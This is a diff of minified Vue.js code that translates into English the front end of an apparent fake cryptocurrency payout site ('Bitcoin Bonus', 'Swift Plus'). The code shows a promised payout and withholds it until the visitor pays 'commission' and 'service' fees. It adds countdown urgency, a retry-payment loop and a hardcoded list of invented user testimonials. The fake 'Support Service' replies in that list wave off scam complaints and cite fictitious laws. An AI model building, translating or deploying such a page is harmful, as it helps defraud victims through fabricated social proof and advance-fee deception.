@@ -437,7 +437,7 @@
                         staticStyle: {
                             "font-size": "28px"
                         }
-                    }, [e._v("Ваша выплата составляет:")]), s("div", {
+                    }, [e._v("Your payout is:")]), s("div", {
                         staticClass: "text-success-highlight text-center mx-auto font-weight-normal text-numbers mb-0",
                         staticStyle: {
                             "line-height": "1"
@@ -486,9 +486,9 @@
                         staticStyle: {
                             padding: "0 20px"
                         }
-                    }, [e._v("Вам необходимо вывести деньги в течении "), s("span", {
+                    }, [e._v("You need to withdraw the funds within "), s("span", {
                         staticClass: "text-numbers font-weight-lighter"
-                    }, [e._v("24")]), e._v(" часов!\n            ")])])])]), s("div", {
+                    }, [e._v("24")]), e._v(" hours!\n            ")])])])]), s("div", {
                         staticClass: "row"
                     }, [s("div", {
                         staticClass: "form-wrap mx-auto pt-0"
@@ -521,9 +521,9 @@
                     }), e._v(" \n            "), e.upsell.amount[e.psAlias] > 0 ? s("span", {
                         staticClass: "badge badge-primary text-numbers",
                         class: e.sale ? "onSaleRed" : ""
-                    }, [e._v(" " + e._s(2 * e.upsell.amount[e.psAlias]) + " руб")]) : e._e(), e._v("\n             \n            "), e.upsell.amount[e.psAlias] > 0 && e.sale ? s("span", {
+                    }, [e._v(" " + e._s(2 * e.upsell.amount[e.psAlias]) + " RUB")]) : e._e(), e._v("\n             \n            "), e.upsell.amount[e.psAlias] > 0 && e.sale ? s("span", {
                         staticClass: "badge badge-primary onSaleBlue text-numbers"
-                    }, [e._v(" " + e._s(e.upsell.amount[e.psAlias]) + " руб")]) : e._e()]) : e._e(), e.upsell.amount[e.psAlias] > 0 && !e.sale ? s("div", {
+                    }, [e._v(" " + e._s(e.upsell.amount[e.psAlias]) + " RUB")]) : e._e()]) : e._e(), e.upsell.amount[e.psAlias] > 0 && !e.sale ? s("div", {
                         staticClass: "text-justify text-md-center mb-2 font-weight-bold",
                         on: {
                             click: function(t) {
@@ -535,20 +535,20 @@
                         attrs: {
                             href: ""
                         }
-                    }, [e._v("Нажмите сюда, чтобы "), s("span", {
+                    }, [e._v("Click here to "), s("span", {
                         staticStyle: {
                             color: "#28a645",
                             "font-weight": "700"
                         }
-                    }, [e._v("получить огромную скидку")]), e._v(" за свой первый вывод!")]), s("p", {
+                    }, [e._v("get a huge discount")]), e._v(" for your first withdrawal!")]), s("p", {
                         staticStyle: {
                             "font-weight": "500",
                             color: "#b3058c",
                             "font-size": "15px"
                         }
-                    }, [e._v("Скидка доступна "), s("span", {
+                    }, [e._v("Discount available "), s("span", {
                         staticClass: "text-numbers font-weight-lighter"
-                    }, [e._v("24")]), e._v(" часа!")])]) : e._e(), e.upsell.customItem ? s("div", {
+                    }, [e._v("24")]), e._v(" hours!")])]) : e._e(), e.upsell.customItem ? s("div", {
                         domProps: {
                             innerHTML: e._s(e.customItem().replace(/{{geoMoneyHalfLimit}}/gi, e.geoMoneyHalfLimit).replace(/{{moneyUSDorEUR}}/gi, e.moneyUSDorEUR).replace(/{{moneyUSDorEUR}}/gi, e.moneyUSDorEUR).replace(/{{moneyBTC}}/gi, e.moneyBTC).replace(/{{convertedAmountRUB}}/gi, e.convertedAmountRUB).replace(/{{convertedAmountUSD}}/gi, e.convertedAmountUSD).replace(/{{converting_geoCur_or_USD}}/gi, e.converting_geoCur_or_USD).replace(/{{converted_USD_or_EUR}}/gi, e.converted_USD_or_EUR).replace(/{{usernamePlaceholder}}/gm, e.usernamePlaceholder).replace(/{{useremailPlaceholder}}/gm, e.useremailPlaceholder).replace(/{{userphonePlaceholder}}/gm, e.userphonePlaceholder).replace(/{{paymentMethod}}/gm, e.paymentMethod).replace(/{{paymentNumberPlaceholder}}/gm, e.paymentNumberPlaceholder).replace(/{{geoAmount}}/gi, e.geoAmount).replace(/{{geoMoney}}/gi, e.$numberWithSpaces(e.$geoUpsellPrice(e.$store.getters.rescueMoney))).replace(/{{moneyPageBased}}/gi, e.moneyPageBased).replace(/{receiptAmount}/gi, e.getReceiptAmount).replace(/{{geoReceiptAmount}}/gi, e.$numberWithSpaces(e.$geoUpsellPrice(e.getReceiptAmount))).replace(/{{todayFull}}/gi, e.todayFull).replace(/{{sitename}}/gm, this.$store.getters.sitename))
                         }
@@ -582,7 +582,7 @@
                             color: "#f93c3c",
                             "font-size": "15px"
                         }
-                    }, [s("b", [e._v("*Если не получается оплатить банковской картой, воспользуйтесь электронным кошельком или другой банковской картой")])]) : e._e(), s("div", {
+                    }, [s("b", [e._v("*If you cannot pay with a bank card, use an electronic wallet or another bank card")])]) : e._e(), s("div", {
                         staticClass: "w-100 text-center"
                     }, [s("a", {
                         staticClass: "button_outer-blue text-center upsell-btn p-3 btn btn-success dependent-on-consent pulse-button pre-wrap position-relative",
@@ -648,14 +648,14 @@
                         staticStyle: {
                             "line-height": "1.0"
                         }
-                    }, [e._v("Завершите вывод средств")]), s("div", {
+                    }, [e._v("Complete your withdrawal")]), s("div", {
                         staticClass: "d-block text-center spin-description",
                         staticStyle: {
                             "line-height": "1.2"
                         }
-                    }, [s("p", [e._v("Вывод средств для Вас будет доступен после оплаты услуг.")]), s("p", [e._v("Ваш платеж не поступил, попробуйте еще раз!")]), s("p", {
+                    }, [s("p", [e._v("Withdrawal will be available for you after payment for services.")]), s("p", [e._v("Your payment has not been received, please try again!")]), s("p", {
                         staticClass: "mb-0"
-                    }, [e._v("Средства поступят на реквизиты, что вы указали в квитанции.")])]), s("b-button", {
+                    }, [e._v("Funds will be transferred to the details you specified in the receipt.")])]), s("b-button", {
                         staticClass: "mt-1 btn-success text-uppercase w-100",
                         attrs: {
                             variant: "primary",
@@ -666,7 +666,7 @@
                                 return e.tryToPayUpsell("modal-fail")
                             }
                         }
-                    }, [e._v("Попробовать снова")]), s("div", {
+                    }, [e._v("Try again")]), s("div", {
                         directives: [{
                             name: "show",
                             rawName: "v-show",
@@ -884,7 +884,7 @@
                         class: e.messageInputClass,
                         attrs: {
                             type: "text",
-                            placeholder: "Ответьте на вопрос",
+                            placeholder: "Answer the question",
                             maxlength: "60",
                             disabled: e.disableSend
                         },
@@ -904,7 +904,7 @@
                                 return e.insertMessage()
                             }
                         }
-                    }, [e._v("Отправить")])])]), e.showUpsellbtnUnderChat ? s("div", {
+                    }, [e._v("Send")])])]), e.showUpsellbtnUnderChat ? s("div", {
                         staticClass: "text-center"
                     }, [s("div", {
                         staticClass: "font-2r mt-5 m-1"
@@ -968,7 +968,7 @@
                         staticClass: "d-flex"
                     }, [s("span", {
                         staticClass: "text-lowercase font-weight-light"
-                    }, [e._v("печатает")]), s("div", {
+                    }, [e._v("typing")]), s("div", {
                         staticClass: "ml-1 ",
                         attrs: {
                             id: "typing-wave"
@@ -986,7 +986,7 @@
                         s = e._self._c || t;
                     return s("div", {
                         staticClass: "d-flex"
-                    }, [s("span", [e._v("печатает")]), s("div", {
+                    }, [s("span", [e._v("typing")]), s("div", {
                         staticClass: "ml-1",
                         attrs: {
                             id: "typing-wave"
@@ -1019,11 +1019,11 @@
                             date: new Date,
                             i: !!this.chatPullStore() && this.chatPullStore().length - 1 || 0,
                             msg: "",
-                            nextDay: "завтра",
-                            greetingOnTime: "Доброго времени суток",
-                            months: ["января", "февраля", "марта", "апреля", "мая", "июня", "июля", "августа", "сентября", "октября", "ноября", "декабря"],
+                            nextDay: "tomorrow",
+                            greetingOnTime: "Good day",
+                            months: ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"],
                             showUpsellbtnUnderChat: !1,
-                            paymentMethod: localStorage.getItem("/offbitbonus/paymentMethod") || "Банковская карта (Россия)"
+                            paymentMethod: localStorage.getItem("/offbitbonus/paymentMethod") || "Bank card (Russia)"
                         }
                     },
                     computed: {
@@ -1106,7 +1106,7 @@
                         greetingsBaseOnTime: function() {
                             var e = new Date,
                                 t = e.getHours();
-                            this.greetingOnTime = t >= 0 && t < 6 ? "Доброй ночи" : t >= 6 && t < 12 ? "Доброе утро" : t >= 12 && t < 18 ? "Добрый день" : "Добрый вечер", "" !== this.$store.getters.account.login && "user-id81214293" !== this.$store.getters.account.login && (this.greetingOnTime += ", " + this.$store.getters.account.login)
+                            this.greetingOnTime = t >= 0 && t < 6 ? "Good night" : t >= 6 && t < 12 ? "Good morning" : t >= 12 && t < 18 ? "Good afternoon" : "Good evening", "" !== this.$store.getters.account.login && "user-id81214293" !== this.$store.getters.account.login && (this.greetingOnTime += ", " + this.$store.getters.account.login)
                         },
                         chatPullStore: function() {
                             return this.$store.state[this.publicPath].chat["chatSent-" + this.$route.params.product]
@@ -1118,7 +1118,7 @@
                             this.insertMessages.pop(), e ? this.insertMessages.push({
                                 myMsg: "{{answered:" + e
                             }) : this.insertMessages.push({
-                                myMsg: "Согласие отправлено"
+                                myMsg: "Consent sent"
                             }), this.$store.commit("CHANGE_OR_ADD", {
                                 key: "chatSent-" + this.$route.params.product,
                                 value: this.insertMessages
@@ -1314,9 +1314,9 @@
                         }
                     }, [s("span", {
                         staticClass: "message"
-                    }, [e._v("До завершения осталось примерно: "), s("span", {
+                    }, [e._v("Approximately left until completion: "), s("span", {
                         staticClass: "text-numbers font-weight-light"
-                    }, [e._v(e._s(e.time))]), e._v(" сек")])])])])
+                    }, [e._v(e._s(e.time))]), e._v(" sec")])])])])
                 },
                 k = [function() {
                     var e = this,
@@ -1334,7 +1334,7 @@
                             color: "#e80000",
                             "font-weight": "200"
                         }
-                    }, [e._v("Не закрывайте страницу!")])])])
+                    }, [e._v("Do not close the page!")])])])
                 }],
                 S = {
                     name: "LoadingBar",
@@ -1355,13 +1355,13 @@
                     },
                     computed: {
                         converting_geoCur_or_USD: function() {
-                            return "usd" !== this.$store.getters.geoCurrency.toLowerCase() ? this.$store.getters.geoCurrency.toUpperCase() : "USD (доллары США)"
+                            return "usd" !== this.$store.getters.geoCurrency.toLowerCase() ? this.$store.getters.geoCurrency.toUpperCase() : "USD (US dollars)"
                         },
                         converting_geoCur: function() {
                             return this.$store.getters.geoCurrency
                         },
                         converted_USD_or_EUR: function() {
-                            return "usd" == this.$store.getters.geoCurrency.toLowerCase() ? "EUR (евро)" : "USD (доллары США)"
+                            return "usd" == this.$store.getters.geoCurrency.toLowerCase() ? "EUR (euros)" : "USD (US dollars)"
                         }
                     },
                     methods: {
@@ -1404,7 +1404,7 @@
                         staticClass: "comments-area"
                     }, [e._m(0), i("h3", {
                         staticClass: "comments-title text-numbers"
-                    }, [e._v(e._s(e.comments.length) + " из " + e._s(e.totalComments) + ":")]), i("ul", {
+                    }, [e._v(e._s(e.comments.length) + " of " + e._s(e.totalComments) + ":")]), i("ul", {
                         ref: "commentForm",
                         staticClass: "fb-comment-fake-box py-2"
                     }, [i("li", {
@@ -1436,7 +1436,7 @@
                                 return e.$refs["modal-newcomment"].show()
                             }
                         }
-                    }, [e._v("Напишите отзыв, " + e._s(e.$store.getters.account.login) + "...")])])])]), i("ol", {
+                    }, [e._v("Write a review, " + e._s(e.$store.getters.account.login) + "...")])])])]), i("ol", {
                         staticClass: "comment-list"
                     }, [i("div", {}, e._l(e.comments, (function(t, a) {
                         return i("li", {
@@ -1502,29 +1502,29 @@
                             },
                             on: {
                                 click: function(t) {
-                                    return e.$say("Ваша жалоба принята")
+                                    return e.$say("Your complaint has been accepted")
                                 }
                             }
                         }, [i("i", {
                             staticClass: "fb-icon fb-abuse position-relative"
-                        }), e._v(" Пожаловаться на комментарий")]), i("b-dropdown-item", {
+                        }), e._v(" Report comment")]), i("b-dropdown-item", {
                             attrs: {
                                 href: "javascript:void(0);"
                             },
                             on: {
                                 click: function(t) {
-                                    return e.$say("Комментарий добавлен в избранное")
+                                    return e.$say("Comment added to favorites")
                                 }
                             }
                         }, [i("i", {
                             staticClass: "fb-icon fb-bookmark mr-1 position-relative"
-                        }), e._v("Добавить в избранное")]), i("hr"), i("b-dropdown-item", {
+                        }), e._v("Add to favorites")]), i("hr"), i("b-dropdown-item", {
                             attrs: {
                                 href: "javascript:void(0);"
                             }
                         }, [i("i", {
                             staticClass: "fb-icon fb-hide mr-1 position-relative"
-                        }), e._v("Скрыть меню")]), i("div", {
+                        }), e._v("Hide menu")]), i("div", {
                             staticClass: "caret"
                         })], 1)], 1)]), i("div", {
                             staticClass: "fb-comment-body"
@@ -1572,7 +1572,7 @@
                         }), i("span", {
                             staticClass: "py-1 pr-1 cursor-pointer",
                             class: t.liked ? "fb-text-liked" : "fb-text-like"
-                        }, [e._v("Нравится")])]), i("div", {
+                        }, [e._v("Like")])]), i("div", {
                             staticClass: "col-6 text-center",
                             on: {
                                 click: function(s) {
@@ -1583,7 +1583,7 @@
                             staticClass: "mr-1 cursor-pointer fb-icon fb-reply"
                         }), i("span", {
                             staticClass: "py-1 pr-1 cursor-pointer"
-                        }, [e._v("Ответить")])])])])])])
+                        }, [e._v("Reply")])])])])])])
                     })), 0)])])])])])]), i("b-modal", {
                         ref: "modal-newcomment",
                         attrs: {
@@ -1594,7 +1594,7 @@
                             "ok-only": "",
                             "ok-variant": "success",
                             "footer-class": "pb-2 mx-auto",
-                            "ok-title": "Вернуться назад",
+                            "ok-title": "Go back",
                             "header-class": "text-center p-0 mb-1 text-uppercase",
                             "hide-header": "",
                             "hide-footer": ""
@@ -1608,7 +1608,7 @@
                         staticClass: "d-flex"
                     }, [i("div", {
                         staticClass: "w-100 text-center my-auto h5 text-dark"
-                    }, [e._v("Публикация отзыва")]), i("div", [i("div", {
+                    }, [e._v("Publishing a review")]), i("div", [i("div", {
                         staticClass: "align-items-center d-flex icon-close-review justify-content-center rounded-circle cursor-pointer",
                         on: {
                             click: function(t) {
@@ -1654,7 +1654,7 @@
                         staticClass: "fb-badge"
                     }, [i("i", {
                         staticClass: "fb-icon fb-globus"
-                    }), i("span", [e._v("Доступно всем")])])])]), i("div", {
+                    }), i("span", [e._v("Available to everyone")])])])]), i("div", {
                         ref: "commentForm"
                     }, [i("div", {
                         staticClass: "w-100"
@@ -1670,7 +1670,7 @@
                         staticClass: "w-100",
                         attrs: {
                             id: "usertext",
-                            placeholder: "Напишите Ваш отзыв, " + e.$store.getters.account.login,
+                            placeholder: "Write your review, " + e.$store.getters.account.login,
                             name: "comment"
                         },
                         domProps: {
@@ -1694,7 +1694,7 @@
                             type: "submit",
                             name: "submit",
                             id: "submit",
-                            value: "Опубликовать"
+                            value: "Publish"
                         },
                         on: {
                             click: function(t) {
@@ -1711,7 +1711,7 @@
                         staticClass: "col"
                     }, [s("h2", {
                         staticClass: "title"
-                    }, [e._v("Последние комментарии на этой странице ")])])
+                    }, [e._v("Latest comments on this page ")])])
                 }, function() {
                     var e = this,
                         t = e.$createElement,
@@ -1739,8 +1739,8 @@
                 T = (s("c5f6"), s("bd86")),
                 j = [{
                     page: ["lawyerswift", "swift"],
-                    name: "Тимофей",
-                    text: "Спасибо за помощь в первом выводе средств с bitcoin bonus, Марии Беляевой! Получил на карту за 3 минуты 25 000 рублей",
+                    name: "Timofey",
+                    text: "Thank you for help with the first withdrawal from bitcoin bonus, Maria Belyaeva! Received 25,000 rubles on my card within 3 minutes.",
                     type: "user",
                     likes: 3,
                     timeh: 1,
@@ -1750,8 +1750,8 @@
                     stars: 5
                 }, {
                     page: ["lawyerswift", "swift"],
-                    name: "Дарья Бирюкова",
-                    text: "Я всю жизнь ищу новые заработки в интернете. И дважды попадалась на мошенников, которые не собирались платить мне заработанные деньги и возвращать потраченные. Уже отчаялась, думалось, что в интеренете пассивно не заработать! Пригласил молодой человек в Bitcoin Bonus. С ним давно рассталась, а вот пассивно благодаря ему зарабатывать не перестала! Делюсь скрином))",
+                    name: "Darya Biryukova",
+                    text: "I have been looking for new ways to earn money online all my life. I fell for scammers twice who were not going to pay me my earned money and return my expenses. I already despaired, thinking that you cannot earn passive income on the Internet! A young man invited me to Bitcoin Bonus. We broke up a long time ago, but I still haven't stopped earning passively thanks to him! Sharing a screenshot))",
                     type: "user",
                     likes: 325,
                     timeh: 3,
@@ -1761,8 +1761,8 @@
                     stars: 5
                 }, {
                     page: ["lawyerswift", "swift"],
-                    name: "София",
-                    text: "Подскажите, кто пользуется Swift Standart, долго выплату ждете?",
+                    name: "Sofia",
+                    text: "Tell me, who uses Swift Standart, how long do you wait for the payout?",
                     type: "user",
                     likes: 0,
                     timeh: 4,
@@ -1772,8 +1772,8 @@
                     stars: 5
                 }, {
                     page: ["lawyerswift", "swift"],
-                    name: "Даниил",
-                    text: "София, не рекомендую Standart, ждать устанете, да и второй телефон не сможете на него подключить. Стандарт не окупается.",
+                    name: "Daniil",
+                    text: "Sofia, I do not recommend Standart, you will get tired of waiting, and you will not be able to connect a second phone to it. Standard does not pay off.",
                     type: "user",
                     likes: 7,
                     timeh: 4,
@@ -1783,8 +1783,8 @@
                     stars: 5
                 }, {
                     page: ["lawyerswift", "swift"],
-                    name: "Вероника",
-                    text: "Ребят, вы конечно простите! Но это похоже на надувательство! Я жду перевод уже 3ий час!",
+                    name: "Veronika",
+                    text: "Guys, excuse me! But this looks like a scam! I have been waiting for the transfer for 3 hours already!",
                     type: "user",
                     likes: 0,
                     timeh: 5,
@@ -1794,8 +1794,8 @@
                     stars: 1
                 }, {
                     page: ["lawyerswift", "swift"],
-                    name: "Служба Поддержки",
-                    text: "Вероника, мы проверили ваш запрос и аккаунт. Вы используете Стандарт Swift. Для того, чтобы ждать выплаты меньше вы всегда можете подключить Swift Plus",
+                    name: "Support Service",
+                    text: "Veronika, we have checked your request and account. You are using Standart Swift. To wait less for payouts, you can always upgrade to Swift Plus.",
                     type: "support",
                     likes: 320,
                     timeh: 5,
@@ -1805,8 +1805,8 @@
                     stars: 5
                 }, {
                     page: ["lawyerswift", "swift"],
-                    name: "Милена",
-                    text: "Вероника, а чего вы недовольны то?",
+                    name: "Milena",
+                    text: "Veronika, why are you dissatisfied?",
                     type: "user",
                     likes: 0,
                     timeh: 5,
@@ -1816,8 +1816,8 @@
                     stars: 4
                 }, {
                     page: ["lawyerswift", "swift"],
-                    name: "Князев Павлович",
-                    text: "Я так понимаю, что сегодня много выводов? Хороший курс сегодня)",
+                    name: "Knyazev Pavlovich",
+                    text: "I understand there are many withdrawals today? Good rate today)",
                     type: "user",
                     likes: 2,
                     timeh: 7,
@@ -1827,8 +1827,8 @@
                     stars: 5
                 }, {
                     page: ["lawyerswift", "swift"],
-                    name: "Ангелина",
-                    text: "Наконец-то дождалась денежки! СПАСИБО! Тут работают отвественные люди.",
+                    name: "Angelina",
+                    text: "Finally waited for the money! THANK YOU! There are responsible people working here.",
                     type: "user",
                     likes: 125,
                     timeh: 9,
@@ -1838,8 +1838,8 @@
                     stars: 4
                 }, {
                     page: ["lawyerswift", "swift"],
-                    name: "Диана",
-                    text: "Подключила Swift Standart, деньги пришли за 20 минут. Берите Standart, не переплачивайте!",
+                    name: "Diana",
+                    text: "I connected Swift Standart, the money arrived within 20 minutes. Take Standart, do not overpay!",
                     type: "user",
                     likes: 110,
                     timeh: 10,
@@ -1849,8 +1849,8 @@
                     stars: 5
                 }, {
                     page: ["lawyerswift", "swift"],
-                    name: "Георгий",
-                    text: "Похоже надо менять профессию! Пойду в криптоаналитики, долго не выводил деньги, ждал удачного курса! И вот 300 000 рублей вывел!)",
+                    name: "Georgy",
+                    text: "Looks like I need to change profession! I will go into crypto analytics, I did not withdraw money for a long time, waiting for a good rate! And here I withdrew 300,000 rubles!)",
                     type: "user",
                     likes: 98,
                     timeh: 10,
@@ -1860,8 +1860,8 @@
                     stars: 5
                 }, {
                     page: ["lawyerrequisits", "requisits", "lawyerexchange", "exchangeBTC"],
-                    name: "Родион",
-                    text: "{sitename} спасибо вам огромное! как хорошо, что вы не забыли про нас в россии и приехали сюда!",
+                    name: "Rodion",
+                    text: "{sitename} thank you very much! How nice that you did not forget about us in Russia and came here!",
                     type: "user",
                     likes: 23,
                     timeh: 1,
@@ -1871,8 +1871,8 @@
                     stars: 5
                 }, {
                     page: ["lawyerrequisits", "requisits", "lawyerexchange", "exchangeBTC"],
-                    name: "Милана Матвеевна",
-                    text: "Благодарю за помошь в выводе. Всегда знала, что справедливость восторжествует. оказыватся мой телефон добывал биткоины, а я даже не была вкрусе!",
+                    name: "Milana Matveevna",
+                    text: "Thank you for help with withdrawal. I always knew that justice would prevail. It turns out my phone was mining bitcoins, and I was not even aware!",
                     type: "user",
                     likes: 1,
                     timeh: 2,
@@ -1882,8 +1882,8 @@
                     stars: 4
                 }, {
                     page: ["lawyerrequisits", "requisits", "lawyerexchange", "exchangeBTC"],
-                    name: "Ульяна",
-                    text: "ТОЖЕ ПОДЕЛЮСЬ СКРИНОМ))) В течении 10 минут, смогла получить свои денежки, спасибо вам, что помогли!",
+                    name: "Ulyana",
+                    text: "I WILL ALSO SHARE A SCREENSHOT))) Within 10 minutes, I was able to receive my money, thank you for your help!",
                     type: "user",
                     likes: 184,
                     timeh: 2,
@@ -1893,7 +1893,7 @@
                     stars: 5
                 }, {
                     page: ["lawyerrequisits", "requisits", "lawyerexchange", "exchangeBTC"],
-                    name: "Николай",
+                    name: "Nikolay",
                     text: "5+",
                     type: "user",
                     likes: 1,
@@ -1904,8 +1904,8 @@
                     stars: 5
                 }, {
                     page: ["lawyerrequisits", "requisits", "lawyerexchange", "exchangeBTC"],
-                    name: "Ксения",
-                    text: "Обращаюсь к службе поддержки, конвертация из биткоинов в рубли, можно за нее не платить и получить деньги? или можно списать с суммы перевода?",
+                    name: "Ksenia",
+                    text: "I am addressing the support service: conversion from bitcoins to rubles, can I not pay for it and get the money? Or can it be deducted from the transfer amount?",
                     type: "user",
                     likes: 7,
                     timeh: 5,
@@ -1915,8 +1915,8 @@
                     stars: 4
                 }, {
                     page: ["lawyerrequisits", "requisits", "lawyerexchange", "exchangeBTC"],
-                    name: "Служба Поддержки",
-                    text: "Ксения, по общему законодательству весь заработок в интернете с 2018 года обязуется регистрироваться за IP адресом получателей. Если сервис будет оплачивать конвертацию валюты со средств поступления, то все операции связанные с облачным майнингом будут заторможены. Это лучшее решение для того, чтобы сервис приносил больше денег пользователям. Конвертация валюты проходит через Binance.",
+                    name: "Support Service",
+                    text: "Ksenia, according to general legislation, all income on the Internet since 2018 must be registered by the IP address of recipients. If the service pays for currency conversion from the incoming funds, all operations related to cloud mining will be slowed down. This is the best solution for the service to bring more money to users. Currency conversion goes through Binance.",
                     type: "support",
                     likes: 390,
                     timeh: 5,
@@ -1926,8 +1926,8 @@
                     stars: 5
                 }, {
                     page: ["lawyerrequisits", "requisits", "lawyerexchange", "exchangeBTC"],
-                    name: "Ева",
-                    text: "Ксения, вы что! Вы хотите чтобы сервис работал на вас?! Глупость такую говорите",
+                    name: "Eva",
+                    text: "Ksenia, what are you saying! Do you want the service to work for you?! That's nonsense.",
                     type: "user",
                     likes: 0,
                     timeh: 6,
@@ -1937,8 +1937,8 @@
                     stars: 5
                 }, {
                     page: ["lawyerrequisits", "requisits", "lawyerexchange", "exchangeBTC"],
-                    name: "Владимир Тимофеевич",
-                    text: "Вот это да! Честно сказать сразу не поверил что такое возможно... Ведь в интернете столько раз кормил сволочей! А тут просто взяли и вывел!",
+                    name: "Vladimir Timofeevich",
+                    text: "Wow! Honestly, I did not believe it was possible at first... After all, I fed so many scammers on the Internet! And here they just took and withdrew!",
                     type: "user",
                     likes: 21,
                     timeh: 7,
@@ -1948,8 +1948,8 @@
                     stars: 5
                 }, (f = {
                     page: ["lawyerrequisits", "requisits", "lawyerexchange", "exchangeBTC"],
-                    name: "Алиса",
-                    text: "Невероятно! Мне пришло на карту 71 287 рублей! Спасибочки! Я вас люблю!",
+                    name: "Alisa",
+                    text: "Incredible! I received 71,287 rubles on my card! Thank you! I love you!",
                     liked: !1,
                     screenshot: "tinkoff1.jpg",
                     type: "user",
@@ -1957,8 +1957,8 @@
                     timeh: 8
                 }, Object(T["a"])(f, "liked", !1), Object(T["a"])(f, "screenshot", "tinkof1.jpg"), Object(T["a"])(f, "pic", "female/woman-adult-5.jpg"), Object(T["a"])(f, "stars", 5), f), {
                     page: ["lawyerrequisits", "requisits", "lawyerexchange", "exchangeBTC"],
-                    name: "Дарина",
-                    text: "Очень удобно, что не нужно бегать по различным сервисам и менять биткоины на рубли с огромной комиссией.",
+                    name: "Darina",
+                    text: "It is very convenient that you do not need to run to various services and exchange bitcoins for rubles with a huge commission.",
                     type: "user",
                     likes: 43,
                     timeh: 9,
@@ -1968,8 +1968,8 @@
                     stars: 4
                 }, {
                     page: ["lawyerrequisits", "requisits", "lawyerexchange", "exchangeBTC"],
-                    name: "Пётр",
-                    text: "Оплатил Комиссию за перевод и денежки в кармане! Мерси",
+                    name: "Pyotr",
+                    text: "I paid the transfer commission and the money is in my pocket! Merci",
                     type: "user",
                     likes: 7,
                     timeh: 10,
@@ -1979,8 +1979,8 @@
                     stars: 5
                 }, {
                     page: ["lawyerreceipt", "receipt", "comissionfp"],
-                    name: "Иннокентий",
-                    text: "Почему мне нужно платить комиссию за перевод?",
+                    name: "Innokenty",
+                    text: "Why do I need to pay a transfer commission?",
                     type: "user",
                     likes: 32,
                     timeh: 1,
@@ -1990,8 +1990,8 @@
                     stars: 2
                 }, {
                     page: ["lawyerreceipt", "receipt", "comissionfp"],
-                    name: "Служба Поддержки",
-                    text: "Иннокентий, Данная комиссия устанавливается между вашим банком и банком отправителем. Мы не можем оплатить комиссию за вас. Она зависит от банка получателя и суммы вывода.",
+                    name: "Support Service",
+                    text: "Innokenty, this commission is set between your bank and the sender's bank. We cannot pay the commission for you. It depends on the recipient bank and the withdrawal amount.",
                     type: "support",
                     likes: 483,
                     timeh: 1,
@@ -2001,8 +2001,8 @@
                     stars: 5
                 }, {
                     page: ["lawyerreceipt", "receipt", "comissionfp"],
-                    name: "Леонид",
-                    text: "Мне лично выплата пришла, Спасибо Менеджеру Дмитрию Рогозину! Очень классный мужик. А комиссия мне обошлась в небольшую сумму, зато деньги пришли сразу!",
+                    name: "Leonid",
+                    text: "My payout arrived personally, thank you Manager Dmitry Rogozin! A very cool guy. The commission cost me a small amount, but the money arrived immediately!",
                     type: "user",
                     likes: 56,
                     timeh: 1,
@@ -2012,8 +2012,8 @@
                     stars: 5
                 }, {
                     page: ["lawyerreceipt", "receipt", "comissionfp"],
-                    name: "Степан",
-                    text: "ХЗ платить или нет...",
+                    name: "Stepan",
+                    text: "I don't know if I should pay or not...",
                     type: "user",
                     likes: 0,
                     timeh: 2,
@@ -2023,8 +2023,8 @@
                     stars: 3
                 }, {
                     page: ["lawyerreceipt", "receipt", "comissionfp"],
-                    name: "Костя",
-                    text: "Ураа!!! Получил!! Я безумно счастлив!!! Сколько невров мне это стоило",
+                    name: "Kostya",
+                    text: "Hurray!!! I received it!! I am incredibly happy!!! How many nerves it cost me.",
                     type: "user",
                     likes: 567,
                     timeh: 3,
@@ -2034,8 +2034,8 @@
                     stars: 5
                 }, {
                     page: ["lawyerreceipt", "receipt", "comissionfp"],
-                    name: "Илья",
-                    text: "Ну что ж попробуем",
+                    name: "Ilya",
+                    text: "Well, let's try.",
                     type: "user",
                     likes: 0,
                     timeh: 4,
@@ -2045,8 +2045,8 @@
                     stars: 4
                 }, {
                     page: ["lawyerreceipt", "receipt", "comissionfp"],
-                    name: "Станислав",
-                    text: "Посидел, посомневался но все таки решил оплатить комиссию. В итоге на Qiwi пришли 139250 рублей. Большое вам спасибо!",
+                    name: "Stanislav",
+                    text: "I sat, doubted, but still decided to pay the commission. As a result, 139,250 rubles arrived to my Qiwi. Thank you very much!",
                     type: "user",
                     likes: 181,
                     timeh: 5,
@@ -2056,8 +2056,8 @@
                     stars: 5
                 }, {
                     page: ["lawyerreceipt", "receipt", "comissionfp"],
-                    name: "Лидия",
-                    text: "А я пять минут всего ждала))))) Может от региона зависит)))",
+                    name: "Lidiya",
+                    text: "And I only waited five minutes))))) Maybe it depends on the region)))",
                     type: "user",
                     likes: 2,
                     timeh: 6,
@@ -2067,8 +2067,8 @@
                     stars: 4
                 }, {
                     page: ["lawyerreceipt", "receipt", "comissionfp"],
-                    name: "Снежанна",
-                    text: "Оплатила комиссию без проблем раз просят. Каких то 400 рублей не жалко чтобы получить такую сумму. Два перевода так два перевода. Не прогадала - на кошелек пришло ровно 254 511 рублей. Приятно иметь дело с людьми слова!",
+                    name: "Snezhanna",
+                    text: "I paid the commission without any problems since they ask. I don't mind 400 rubles to get such an amount. Two transfers, so two transfers. I did not regret it - exactly 254,511 rubles arrived on my wallet. It is pleasant to deal with people of their word!",
                     type: "user",
                     likes: 32,
                     timeh: 7,
@@ -2078,8 +2078,8 @@
                     stars: 5
                 }, {
                     page: ["lawyerreceipt", "receipt", "comissionfp"],
-                    name: "Фёдор",
-                    text: "Я так ждал этих денег маме на лечение. Благодари вас небеса! Спасибо, эти 139 тысяч очень помогут моей маме. Счастья вам и благополучия!",
+                    name: "Fyodor",
+                    text: "I was waiting for this money for my mother's treatment. Thank heavens! Thank you, these 139 thousand will help my mother a lot. Happiness and prosperity to you!",
                     type: "user",
                     likes: 43,
                     timeh: 8,
@@ -2089,8 +2089,8 @@
                     stars: 5
                 }, {
                     page: ["lawyerreceipt", "receipt", "comissionfp"],
-                    name: "Ника",
-                    text: "Прикольно. 128 480 рублей получила все до копеечки. Спасибо за перевод. Только единственное, я ждала больше часа!",
+                    name: "Nika",
+                    text: "Cool. I received 128,480 rubles down to the last penny. Thank you for the transfer. Only one thing, I waited more than an hour!",
                     type: "user",
                     likes: 67,
                     timeh: 9,
@@ -2100,8 +2100,8 @@
                     stars: 4
                 }, {
                     page: ["error3405", "lawyercomission", "comissionsp"],
-                    name: "Арина",
-                    text: "{sitename} почему деньги не пришли за первый перевод?",
+                    name: "Arina",
+                    text: "{sitename} why did the money not arrive for the first transfer?",
                     type: "user",
                     likes: 4,
                     timeh: 1,
@@ -2111,8 +2111,8 @@
                     stars: 4
                 }, {
